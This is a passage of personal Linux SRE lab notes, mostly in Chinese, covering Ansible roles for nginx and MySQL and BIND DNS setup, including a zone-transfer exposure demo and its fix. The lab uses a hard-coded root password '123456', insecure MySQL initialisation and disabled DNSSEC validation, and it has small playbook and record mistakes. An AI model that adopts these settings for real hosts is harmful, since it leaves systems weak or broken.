# if False, sftp will not use batch mode to transfer files. This may cause some
# types of file transfer failures impossible to catch however, and should
# only be disabled if your sftp version has problems with batch mode
#sftp_batch_mode = False

# The -tt argument is passed to ssh when pipelining is not enabled because sudo 
# requires a tty by default. 
#usetty = True

# Number of times to retry an SSH connection to a host, in case of UNREACHABLE.
# For each retry attempt, there is an exponential backoff,
# so after the first attempt there is 1s wait, then 2s, 4s etc. up to 30s (max).
#retries = 3

[persistent_connection]

# Configures the persistent connection timeout value in seconds.  This value is
# how long the persistent connection will remain idle before it is destroyed.
# If the connection doesn't receive a request before the timeout value
# expires, the connection is shutdown. The default value is 30 seconds.
#connect_timeout = 30

# The command timeout value defines the amount of time to wait for a command
# or RPC call before timing out. The value for the command timeout must
# be less than the value of the persistent connection idle timeout (connect_timeout)
# The default value is 30 second.
#command_timeout = 30

[accelerate]
#accelerate_port = 5099
#accelerate_timeout = 30
#accelerate_connect_timeout = 5.0

# The daemon timeout is measured in minutes. This time is measured
# from the last activity to the accelerate daemon.
#accelerate_daemon_timeout = 30

# If set to yes, accelerate_multi_key will allow multiple
# private keys to be uploaded to it, though each user must
# have access to the system via SSH to add a new key. The default
# is "no".
#accelerate_multi_key = yes

[selinux]
# file systems that require special treatment when dealing with security context
# the default behaviour that copies the existing context or uses the user default
# needs to be changed to use the file system dependent context.
#special_context_filesystems=nfs,vboxsf,fuse,ramfs,9p,vfat

# Set this to yes to allow libvirt_lxc connections to work without SELinux.
#libvirt_lxc_noseclabel = yes

[colors]
#highlight = white
#verbose = blue
#warn = bright purple
#error = red
#debug = dark gray
#deprecate = purple
#skip = cyan
#unreachable = red
#ok = green
#changed = yellow
#diff_add = green
#diff_remove = red
#diff_lines = cyan


[diff]
# Always print diff when running ( same as always running with -D/--diff )
# always = no

# Set how many context lines to show in diff
# context = 3
```

**hosts:**

```
[local]
10.0.0.8 ansible_connection=local

[dnsservers]
10.0.0.10

[webservers]
10.0.0.67
10.0.0.18
10.0.0.100
10.0.0.152
[web8servers]
10.0.0.18
10.0.0.28
10.0.0.38
10.0.0.48
10.0.0.58

[web7servers]
10.0.0.7
10.0.0.17
10.0.0.27
10.0.0.37
```

**install_nginx.yml:**

```
---
#This is nginx playbook
- hosts: 
    10.0.0.67
  
  roles:
    - nginx
```

**roles:**

```
#0.创建role的步骤：

1 创建以roles命名的目录
2 在roles目录中分别创建以各角色名称命名的目录，如mysql等
3 在每个角色命名的目录中分别创建files、handlers、tasks、templates和vars等目录；用不到的目录可以创建为空目录，也可以不创建
4 在每个角色相关的子目录中创建相应的文件,如 tasks/main.yml,templates/nginx.conf.j2
5 在playbook文件中，调用需要的角色



#1.整体目录结构：
[17:01:56 root@centos7 nginx_ansible]#tree roles/
roles/
└── nginx
    ├── handlers
    │   └── main.yml
    ├── tasks
    │   ├── config.yml
    │   ├── group.yml
    │   ├── install.yml
    │   ├── link.yml
    │   ├── main.yml
    │   ├── package.yml
    │   ├── service.yml
    │   ├── unarchive.yml
    │   ├── unit.yml
    │   └── user.yml
    ├── templates
    │   ├── nginx.conf.j2
    │   └── nginx.service.j2
    └── vars
        └── main.yml

5 directories, 14 files



#3.创建文件夹
[19:43:30 root@ansible roles]# mkdir /data/ansible/roles/nginx/{tasks,handlers,vars,templates} -pv



#4.创建对应的handlers文件
[17:02:48 root@centos7 nginx_ansible]#cd /data/ansible/roles/nginx/handlers/
[17:06:20 root@centos7 handlers]#cat main.yml 
- name: restart nginx
  service: name=nginx state=restarted



#5.创建对应的tasks文件
[17:02:48 root@centos7 nginx_ansible]#cd /data/ansible/roles/nginx/tasks/


#5.1.创建任务执行顺序总main.yml文件
[17:08:23 root@centos7 tasks]#cat main.yml 
- include: group.yml
- include: user.yml
- include: package.yml
- include: unarchive.yml
- include: install.yml
- include: unit.yml
- include: config.yml
- include: link.yml
- include: service.yml

#5.2创建对应的组group.yml
[17:08:31 root@centos7 tasks]#cat group.yml 
- name: create {{ group_name }} group
  group: name={{ group_name }} system=yes
  
  
#5.3创建对应的user.yml
[17:09:35 root@centos7 tasks]#cat user.yml 
- name: create {{ user_name }} user
  user: name={{ user_name }} system=yes group={{ group_name }} shell=/sbin/nologin
  
  
#5.4创建对应的安装包package.yml
[17:10:09 root@centos7 tasks]#cat package.yml 
- name: yum nginx dependence packages to centos7
  yum: name={{ centos7_packages }}
  when: ansible_distribution_major_version == "7"
- name: yum nginx dependence packages to centos8
  yum: name={{ centos8_packages }}
  when: ansible_distribution_major_version == "8"
- name: apt nginx dependence packages to ubuntu
  apt: name={{ ubuntu_packages }}
  when: ansible_os_family == "Debian"
- name: download {{ nginx_full_name }}
  get_url: url={{ nginx_url }}/{{ nginx_full_name }} dest={{ nginx_src }}
  
  
#5.5下载并解压文件unarchive.yml 
[17:11:31 root@centos7 tasks]#cat unarchive.yml 
- name: unarchive {{ nginx_full_name }}
  unarchive: src={{ nginx_src }}/{{ nginx_full_name }} dest={{ nginx_src }}  copy=no


#5.6编译安装到指定目录install.yml
[17:12:36 root@centos7 tasks]#cat install.yml 
- name: configure
  shell: 
    ./configure \
    --prefix={{ nginx_install_dir }} \
    --user=nginx --group=nginx \
    --with-http_ssl_module \
    --with-http_v2_module \
    --with-http_realip_module \
    --with-http_stub_status_module \
    --with-http_gzip_static_module \
    --with-pcre \
    --with-stream \
    --with-stream_ssl_module \
    --with-stream_realip_module
  args:
    chdir: "{{ nginx_src }}/nginx-{{ nginx_version }}"
- name: make && make install
  shell: make -j {{ ansible_processor_vcpus }} && make install
  args:
    chdir: "{{ nginx_src }}/nginx-{{ nginx_version }}"
- name: add nginx to profile
  copy: content=PATH={{ nginx_install_dir }}/sbin:{{ ansible_env.PATH }} dest=/etc/profile.d/nginx.sh



#5.7创建unit.yml文件
[17:14:53 root@centos7 tasks]#cat unit.yml 
- name: copy nginx.service to centos
  template: src=nginx.service.j2 dest=/usr/lib/systemd/system/nginx.service
  when: ansible_os_family == "RedHat"
- name: copy nginx.service to ubuntu
  template: src=nginx.service.j2 dest=/lib/systemd/system/nginx.service
  when: ansible_os_family == "Debian"
- name: reload systemd manager configuration 
  shell: systemctl daemon-reload
  
  
#5.8创建配置文件config.yml 
[17:15:36 root@centos7 tasks]#cat config.yml 
- name: template config to remote hosts
  template: src=nginx.conf.j2 dest={{ nginx_install_dir }}/conf/nginx.conf
  notify: 
    - restart nginx


#5.9创建软连接link.yml
[17:16:11 root@centos7 tasks]#cat link.yml 
- name: create linkfile /apps/nginx/sbin/nginx
  shell: src=/apps/nginx/sbin/nginx dest=/usr/sbin/nginx state=link
  
  
#5.10创建service.yml
[17:16:43 root@centos7 tasks]#cat service.yml
- name: start nginx.service
  service: name=nginx state=started enabled=yes





#6.创建对应的templates文件
[17:02:48 root@centos7 nginx_ansible]#cd /data/ansible/roles/nginx/templates/


#6.1创建nginx.conf.j2
user  {{ user_name }} {{ group_name }};
worker_processes  {{ ansible_processor_vcpus }};

#error_log  logs/error.log;
#error_log  logs/error.log  notice;
#error_log  logs/error.log  info;

pid        run/nginx.pid;


events {
    worker_connections  1024;
}


http {
    include       mime.types;
    default_type  application/octet-stream;

    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
    #                  '$status $body_bytes_sent "$http_referer" '
    #                  '"$http_user_agent" "$http_x_forwarded_for"';

    #access_log  logs/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    #keepalive_timeout  0;
    keepalive_timeout  65;

    #gzip  on;

    server {
        listen       80;
        server_name  localhost;

        #charset koi8-r;

        #access_log  logs/host.access.log  main;

        location / {
            root   html;
            index  index.html index.htm;
        }

        #error_page  404              /404.html;

        # redirect server error pages to the static page /50x.html
        #
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }

        # proxy the PHP scripts to Apache listening on 127.0.0.1:80
        #
        #location ~ \.php$ {
        #    proxy_pass   http://127.0.0.1;
        #}

        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
        #
        #location ~ \.php$ {
        #    root           html;
        #    fastcgi_pass   127.0.0.1:9000;
        #    fastcgi_index  index.php;
        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;
        #    include        fastcgi_params;
        #}

        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht {
        #    deny  all;
        #}
    }


    # another virtual host using mix of IP-, name-, and port-based configuration
    #
    #server {
    #    listen       8000;
    #    listen       somename:8080;
    #    server_name  somename  alias  another.alias;

    #    location / {
    #        root   html;
    #        index  index.html index.htm;
    #    }
    #}


    # HTTPS server
    #
    #server {
    #    listen       443 ssl;
    #    server_name  localhost;

    #    ssl_certificate      cert.pem;
    #    ssl_certificate_key  cert.key;

    #    ssl_session_cache    shared:SSL:1m;
    #    ssl_session_timeout  5m;

    #    ssl_ciphers  HIGH:!aNULL:!MD5;
    #    ssl_prefer_server_ciphers  on;

    #    location / {
    #        root   html;
    #        index  index.html index.htm;
    #    }
    #}

}


#6.2创建nginx.service.j2
[17:23:37 root@centos7 templates]#cat nginx.service.j2 
[Unit]
Description=nginx - high performance web server
Documentation=http://nginx.org/en/docs/
After=network-online.target remote-fs.target nss-lookup.target
Wants=network-online.target
[Service]
Type=forking
PIDFile={{ nginx_install_dir }}/run/nginx.pid
ExecStart={{ nginx_install_dir }}/sbin/nginx -c {{ nginx_install_dir }}/conf/nginx.conf
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID
[Install]
WantedBy=multi-user.target




#7.创建对应的vars文件
[17:02:48 root@centos7 nginx_ansible]#cd /data/ansible/roles/nginx/vars/


[17:25:20 root@centos7 vars]#cat main.yml 
nginx_version: 1.20.1
nginx_url: http://nginx.org/download
nginx_full_name: nginx-{{ nginx_version }}.tar.gz
nginx_src: /usr/local/src
nginx_install_dir: /apps/nginx

user_name: nginx
group_name: nginx

centos7_packages: [ make,gcc,pcre-devel,openssl-devel,zlib-devel,perl-ExtUtils-Embed ] 
centos8_packages: [ make,gcc-c++,libtool,pcre,pcre-devel,zlib,zlib-devel,openssl,openssl-devel,perl-ExtUtils-Embed ]
ubuntu_packages: [ make,gcc,libpcre3,libpcre3-dev,openssl,libssl-dev,zlib1g-dev ]
```

![1654340478799](linuxSRE.assets/1654340478799.png)

##### 31.用role多台主机部署mysql5.7-8.0

```
#整体文件的目录结构
[23:44:14 root@ansible mysql]#pwd
/data/ansible/roles/mysql
[00:08:34 root@ansible mysql]#tree
.
├── files
│   ├── my.cnf
│   └── mysql-8.0.19-linux-glibc2.12-x86_64.tar.xz
├── tasks
│   ├── config.yml
│   ├── data.yml
│   ├── group.yml
│   ├── install.yml
│   ├── linkfile.yml
│   ├── main.yml
│   ├── path.yml
│   ├── script.yml
│   ├── secure.yml
│   ├── service.yml
│   ├── source.yml
│   ├── unarchive.yml
│   └── user.yml
└── vars
    └── main.yml

3 directories, 16 files


#0.创建相应文件夹
[19:43:30 root@ansible roles]# mkdir /data/ansible/roles/mysql/{tasks,vars,files} -pv
[19:43:30 root@ansible roles]# cd /data/ansible/
[23:37:13 root@ansible ansible]# cat > mysql.sh <<EOF
PATH=/usr/local/mysql/bin/:$PATH
EOF
[23:38:35 root@ansible ansible]#cat mysql.sh 
PATH=/usr/local/mysql/bin/:$PATH #注意这个环境变量歹是完整一行，不然最后mysql起不来




#1.配置files里的文件
[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/files/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF


#2.配置变量vars
[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/vars/main.yml <<EOF
mysql_version: 8.0.23
//mysql_version: 5.7.38
mysql_file: mysql-{{mysql_version}}-linux-glibc2.12-x86_64.tar.xz
//mysql_file: mysql-{{mysql_version}}-linux-glibc2.12-x86_64.tar.gz
mysql_root_password: 123456
EOF


#3.配置tasks的主任务列表main.yml
[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/main.yml <<EOF
- include: install.yml
- include: group.yml
- include: user.yml
- include: unarchive.yml
- include: linkfile.yml
- include: data.yml
- include: config.yml
- include: script.yml
- include: path.yml
- include: service.yml
- include: secure.yml
- include: source.yml
EOF


#4.配置tasks的子任务
[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/install.yml <<EOF
- name: install package
  yum:
    name:
      - libaio
      - numactl-libs
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/group.yml <<EOF
- name: create mysql group
  group: name=mysql gid=306
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/user.yml <<EOF
- name: create mysql user
  user: name=mysql uid=306 group=mysql shell=/sbin/nologin system=yes create_home=no home=/data/mysql
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/unarchive.yml <<EOF
- name: copy tar to remote host and file mode
  unarchive: src={{mysql_file}} dest=/usr/local/ owner=root group=root
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/linkfile.yml <<EOF
- name: create linkfile /usr/local/mysql
  file: src=/usr/local/mysql-{{mysql_version}}-linux-glibc2.12-x86_64 dest=/usr/local/mysql state=link
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/data.yml <<EOF
- name: data dir
  shell: /usr/local/mysql/bin/mysqld --initialize-insecure --user=mysql --datadir=/data/mysql
  tags: data
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/config.yml <<EOF
- name: config my.cnf
  copy: src=/data/ansible/files/my.cnf dest=/etc/my.cnf
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/script.yml <<EOF
- name: service script
  shell: /bin/cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/path.yml <<EOF
- name: PATH variable
  copy: src=/data/ansible/mysql.sh dest=/etc/profile.d/mysql.sh
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/service.yml <<EOF
- name: enable service
  shell: chkconfig --add mysqld;/etc/init.d/mysqld start
  tags: service
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/secure.yml <<EOF
- name: change password
  shell: /usr/local/mysql/bin/mysqladmin -uroot password {{mysql_root_password}}
EOF


[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/source.yml <<EOF
- name: source PATH
  shell: source /etc/profile.d/mysql.sh;
EOF



#5.在playbook中调用角色
[18:22:07 root@ansible ansible]# pwd
/data/ansible
[18:22:10 root@ansible ansible]# vim mysql.yml
- hosts: 10.0.0.*

  roles:
  //  - nginx #之前创建的nginx文件夹
    - mysql
[18:54:51 root@ansible ansible]# ansible-playbook -C nginx.yml #检查语法
[18:54:51 root@ansible ansible]# ansible-playbook mysql.yml
```

## 32.搭建DNS服务器

### 32.1.私有的DNS服务互联网访问

```
完整的查询请求经过的流程:
Client -->hosts文件 --> Client DNS Service Local Cache --> DNS Server (recursion递归) --> DNS Server Cache -->DNS iteration(迭代) --> 根--> 顶级域名DNS-->二级域名
DNS…

#1.私有的DNS服务互联网访问
#服务器端
[root@centos8 ~]#yum -y install bind 
[root@centos8 ~]# systemctl enable --now named.service
#此时的服务器已经作为一个DNS服务器，如果别的服务器想要通过连接这个域名服务器来ping www.baidu.com,要修改named.conf的配置文件
options {
        //listen-on port 53 { localhost; }; #也可以直接删掉
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
        // allow-query     { any; };   #也可以直接删掉
[root@centos8 ~]# rndc reload #重新加载配置文件
[root@centos8 ~]# rndc flush #清除缓存

#客户端
[root@centos7_clone1 ~]# yum -y install bind-utils
[root@centos7_clone1 network-scripts]# host www.baidu.com
www.baidu.com is an alias for www.a.shifen.com.
www.a.shifen.com has address 39.156.66.14
www.a.shifen.com has address 39.156.66.18
```

### 32.2内部网络的DNS服务

#### 32.2.1正向解析DNS服务

```
#服务器端
[root@centos8 ~]# vim /etc/named.rfc1912.zones
#定义自己公司内部的域名解析文件
zone "liusenbiao.cn" {
        type master;
        file "liusenbiao.cn.zone"; #去xxx.zone文件解析
};
[root@centos8 ~]# cd /var/named/
[root@centos8 named]# cp named.localhost liusenbiao.cn.zone -p
#-p是保留原有权限的意思
[root@centos8 named]# ll liusenbiao.cn.zone
-rw-r----- 1 root named 152 Apr 24  2020 liusenbiao.cn.zone
[root@centos8 named]# vim liusenbiao.cn.zone
$TTL 1D
@   IN SOA  master admin.liusenbiao.org. (
                   0    ; serial #版本更新序列号
                   1D   ; refresh#一天更新一次
                   1H   ; retry #更新失败，1小时再试一次
                   1W   ; expire#一直同步不上，认为是过期数据
                   3H )     ; minimum#若有骚扰数据，不查磁盘
    NS  master
master  A   10.0.0.8
www     A   10.0.0.153 #ubuntu地址，为了做测试，搭建web服务
db      A   10.0.0.123
ks8node1 A  10.0.0.101
ks8node2 A  10.0.0.102
*        A  10.0.0.153 #泛域名解析wwwwwww.liusenbiao.cn
@        A  10.0.0.153 #不需要写www
@        MX 10 mail1 #配置邮件服务器：10代表优先级
mail1    A  10.0.0.201

SOA：Start Of Authority，起始授权记录；一个区域解析库有且仅能有一个SOA记录，必须位于
解析库的第一条记录
A：internet Address，作用，名称 --> IP
AAAA：FQDN --> IPv6
PTR：PoinTeR，IP --> FQDN
NS：Name Server,当前域名将来有几个DNS服务器 
CNAME ： Canonical Name，别名记录
MX：Mail eXchanger，邮件交换器
使用 “@” 符号可用于引用当前区域的名字
[root@centos8 named]# named-checkconf #检查语法是否正确
[root@centos8 named]# named-checkzone liusenbiao.cn liusenbiao.cn.zone  #检查.zone文件是否正确 
zone liusenbiao.cn/IN: loaded serial 0
OK

#用ubuntu搭建web服务
root@ubuntu1804:~# apt install apache2
root@ubuntu1804:~# vim /var/www/html/index.html
www.liusenbiao.cn

#centos7做联通性测试
[root@centos7_clone1 ~]# dig www.liusenbiao.cn
;; ANSWER SECTION:
www.liusenbiao.cn.	86400	IN	A	10.0.0.153
[root@centos7_clone1 ~]# curl www.liusenbiao.cn
www.liusenbiao.cn
```

#### 32.2.2反向解析DNS服务

```
#centos8服务器端
[root@centos8 named]# vim /etc/named.rfc1912.zones
#0.0.10.in-addr.arpa反向解析的域名
zone "0.0.10.in-addr.arpa" {
        type master;
        file "10.0.0.zone"; #随便写
};
[root@centos8 named]# pwd
/var/named
[root@centos8 named]# vim 10.0.0.zone
$TTL 1D
@   IN SOA  ns1 admin.liusenbiao.org. (
                    0   ; serial
                    1D  ; refresh
                    1H  ; retry
                    1W  ; expire
                    3H )    ; minimum
    NS ns1.liusenbiao.cn. 
166 PTR www.liusenbiao.cn. #PTR代表的是反向解析
200 PTR app.liusenbiao.cn.
[root@centos8 named]# chmod 640 10.0.0.zone ;chgrp named 10.0.0.zone 
[root@centos8 named]# rndc reload #只加载配置文件
[root@centos8 named]# rndc stop #暂停DNS服务
[root@centos8 named]# systemctl start named #开始DNS服务

#centos7测试端
[root@centos7_clone1 ~]# dig -t ptr 100.0.0.10.in-addr.arpa
#status: NXDOMAIN：没解析成功！！！
[root@centos7_clone1 ~]# dig -t ptr 100.0.0.10.in-addr.arpa
#解析成功!!!：
;; ANSWER SECTION:
100.0.0.10.in-addr.arpa. 86400	IN	PTR	www.liusenbiao.cn.
[root@centos7_clone1 ~]# dig -t ptr 200.0.0.10.in-addr.arpa
#解析成功!!!
;; ANSWER SECTION:
200.0.0.10.in-addr.arpa. 86400	IN	PTR	app.liusenbiao.cn.

#开启缓存
[root@centos7_clone1 ~]# yum -y install nscd
[root@centos7_clone1 ~]# systemctl enable --now nscd
[root@centos7_clone1 ~]# nscd -g #查看缓存信息
[root@centos7_clone1 ~]# nscd -i hosts #清除缓存

#ubuntu修改配置
root@ubuntu1804:~# vim /etc/netplan/01-netcfg.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses:
      - 10.0.0.153/24
      gateway4: 10.0.0.2
      nameservers:
         search: [liusenbiao.cn,liusenbiao.org]
         addresses: [10.0.0.8] #指向配置的DNS服务器
root@ubuntu1804:~# systemd-resolve --status #查看是否生效
Link 2 (ens33)
      Current Scopes: DNS
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no
         DNS Servers: 10.0.0.8  #出现这个代表有效成功
          DNS Domain: liusenbiao.cn
                      liusenbiao.org
```

#### 32.2.3实现子DNS服务器

```
#[root@centos8 ~]是实现DNS的主服务器，10.0.0.8
#root@centos8_1是实现DNS子服务器，10.0.0.152
#目标:实现主从节点，主从复制和主从抓包安全问题
#实现了容错和负载均衡

#DNS子服务器
root@centos8_1:~# dnf -y install bind
root@centos8_1:~# vim /etc/named.conf
options {
//      listen-on port 53 { 127.0.0.1; };#注释这行
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
//      allow-query     { localhost; };#注释这行
root@centos8_1:~# vim /etc/named.rfc1912.zones
zone "liusenbiao.cn" {
        type slave;
        masters {10.0.0.8;};
        file "slaves/liusenbiao.cn.slave";
};
root@centos8_1:~# systemctl enable --now named
Created symlink /etc/systemd/system/multi-user.target.wants/named.service → /usr/lib/systemd/system/named.service
root@centos8_1:~# ll /var/named/slaves/
#看看子服务器有没有同步数据
total 4
-rw-r--r-- 1 named named 505 May 15 13:57 liusenbiao.cn.slave
#看看主服务器修改数据，子服务器有没有实时更新数据
root@centos8_1:~# ll /var/named/slaves/liusenbiao.cn.slave 
-rw-r--r-- 1 named named 624 May 15 23:20 /var/named/slaves/liusenbiao.cn.slave
root@centos8_1:~# vim /etc/named.conf
options {
//      listen-on port 53 { 127.0.0.1; };
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
//      allow-query     { localhost; };
        allow-transfer  {none;}; #从DNS服务器不允许任何人抓取数据
root@centos8_1:~# rndc reload
 
 
 
#centos7
[root@centos7_clone1 ~]# cd /etc/sysconfig/network-scripts
[root@centos7_clone1 network-scripts]# vim ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
ONBOOT=yes
IPADDR=10.0.0.166
PREFIX=24
GATEWAY=10.0.0.2
DNS1=10.0.0.8
DNS2=10.0.0.152 #指向子服务器的DNS
ONBOOT=yes
[root@centos7_clone1 network-scripts]# systemctl restart network
[root@centos7_clone1 ~]# cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 10.0.0.8
nameserver 10.0.0.152 #新加的DNS服务器
[root@centos7_clone1 ~]# dig www.liusenbiao.cn
;; Query time: 1 msec
;; SERVER: 10.0.0.152#53(10.0.0.152) #子DNS启动成功！！！
;; WHEN: Sun May 15 22:10:30 CST 2022
;; MSG SIZE  rcvd: 99
#看看主服务器修改数据，子服务器有没有实时更新数据
[root@centos7_clone1 ~]# dig www.liusenbiao.cn @10.0.0.152
;; ANSWER SECTION:
www.liusenbiao.cn.	86400	IN	CNAME	cdn.liusenbiao.cn.
cdn.liusenbiao.cn.	86400	IN	A	10.0.0.222 #实时同步了！！
[root@centos7_clone1 ~]# dig -t axfr liusenbiao.cn
#安全问题：黑客可以通过抓包抓到DNS所有的数据
; <<>> DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7 <<>> -t axfr liusenbiao.cn
;; global options: +cmd
liusenbiao.cn.		86400	IN	SOA	master.liusenbiao.cn. admin.liusenbiao.org. 3 86400 3600 604800 10800
liusenbiao.cn.		86400	IN	A	10.0.0.153
liusenbiao.cn.		86400	IN	NS	master.liusenbiao.cn.
liusenbiao.cn.		86400	IN	NS	slaves1.liusenbiao.cn.
*.liusenbiao.cn.	86400	IN	A	10.0.0.153
cdn.liusenbiao.cn.	86400	IN	A	10.0.0.222
db.liusenbiao.cn.	86400	IN	A	10.0.0.123
ks8node1.liusenbiao.cn.	86400	IN	A	10.0.0.101
ks8node2.liusenbiao.cn.	86400	IN	A	10.0.0.102
master.liusenbiao.cn.	86400	IN	A	10.0.0.8
slaves1.liusenbiao.cn.	86400	IN	A	10.0.0.152
www.liusenbiao.cn.	86400	IN	CNAME	cdn.liusenbiao.cn.
liusenbiao.cn.		86400	IN	SOA	master.liusenbiao.cn. admin.liusenbiao.org. 3 86400 3600 604800 10800
;; Query time: 1 msec
;; SERVER: 10.0.0.8#53(10.0.0.8)
;; WHEN: Sun May 15 23:34:16 CST 2022
;; XFR size: 13 records (messages 1, bytes 350)
[root@centos7_clone1 ~]# dig -t axfr liusenbiao.cn
#allow-transfer  {10.0.0.152;};之后想要再抓取数据就不行了
; <<>> DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7 <<>> -t axfr liusenbiao.cn
;; global optons: +cmd
; Transfer fa#iled.




#centos8
#DNS的主服务器
#把主服务器挂了
[root@centos8 ~]# rndc stop
[root@centos8 ~]# systemctl start named
#实现主从DNS服务器数据同步问题
[root@centos8 ~]# vim /var/named/liusenbiao.cn.zone
$TTL 1D
@   IN SOA  master admin.liusenbiao.org. (
                   2    ; serial #只有改变版本号才能实现子DNS同步
                   1D   ; refresh
                   1H   ; retry
                   1W   ; expire
                   3H )     ; minimum
    NS  master
    NS  slaves1 #添加子DNS的名称(随便写)
master  A   10.0.0.8 
slaves1  A   10.0.0.152 #添加子DNS的ip
www     CNAME cdn.liusenbiao.cn.
cdn     A   10.0.0.222 #修改内容
db      A   10.0.0.123
ks8node1 A  10.0.0.101
ks8node2 A  10.0.0.102
*        A  10.0.0.153
@        A  10.0.0.153
#解决安全问题：即允许谁能从我这里抓取所有数据库
[root@centos8 ~]# vim /etc/named.conf 
options {
        listen-on port 53 { localhost; };
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
        allow-query     { any; };
        allow-transfer  {10.0.0.152;};#设置主DNS禁止抓取数据
[root@centos8 ~]# rndc reload
```

#### 32.2.4实现DNS子域服务器

```
[root@centos8 ~]是实现DNS的主服务器，10.0.0.8
root@centos8_1是实现DNS子服务器，10.0.0.152
[root@centos8_clone1 ~]是子域DNS服务器，10.0.0.154
#用ubuntu搭建web服务，ip地址10.0.0.153

#centos8主DNS服务器
[root@centos8 ~]# vim /etc/named.conf
options {
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
        allow-transfer  {10.0.0.152;};
#在 If you are building an AUTHORITATIVE DNS server下
 dnssec-enable no; #建议关闭加密验证
 dnssec-validation no;#建议关闭加密验证

[root@centos8 ~]# vim /var/named/liusenbiao.cn.zone
$TTL 1D
@   IN SOA  master admin.liusenbiao.org. (
                   5    ; serial #版本号一定要改
                   1D   ; refresh
                   1H   ; retry
                   1W   ; expire
                   3H )     ; minimum
          NS    master
          NS    slaves1
shanghai  NS    shanghaiDNS #子域委派DNS服务器
master  A   10.0.0.8
slaves1  A   10.0.0.152
shanghaiDNS A 10.0.0.154 #子域委派DNS服务器
www      A   10.0.0.153
[root@centos8 ~]# rndc reload


#centos8_clone1子域委派DNS服务器
[root@centos8_clone1 ~]# dnf -y install bind
[root@centos8_clone1 ~]# vim /etc/named.conf
options {
//      listen-on port 53 { 127.0.0.1; };
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
//      allow-query     { localhost; };
[root@centos8_clone1 ~]# vim /etc/named.rfc1912.zones
zone "shanghai.liusenbiao.cn" {
        type master;
        file "shanghai.liusenbiao.cn.zone";
};
[root@centos8_clone1 ~]# vim /var/named/shanghai.liusenbiao.cn.zone
$TTL 1D
@    IN SOA  ns1 admin (1 12H 10M 3D 1H)
     NS ns1         
ns1   A  10.0.0.154 #本机ip
www   A  10.0.0.200 
#（1 12H 10M 3D 1H）代表->版本号：同步间隔：同步失败多久同步一次：过期时间：缓存时长
[root@centos8_clone1 ~]# chgrp named /var/named/shanghai.liusenbiao.cn.zone ;chmod 640 /var/named/shanghai.liusenbiao.cn.zone
[root@centos8_clone1 ~]# ll /var/named/shanghai.liusenbiao.cn.zone
-rw-r----- 1 root named 101 May 16 11:31 /var/named/shanghai.liusenbiao.cn.zone
[root@centos8_clone1 ~]# systemctl enable --now named

#centos7作为客户端测试
[root@centos7_clone1 ~]# dig www.shanghai.liusenbiao.cn
;; ANSWER SECTION:
www.shanghai.liusenbiao.cn. 86400 IN	A	10.0.0.200 #表示测试成功！！
```

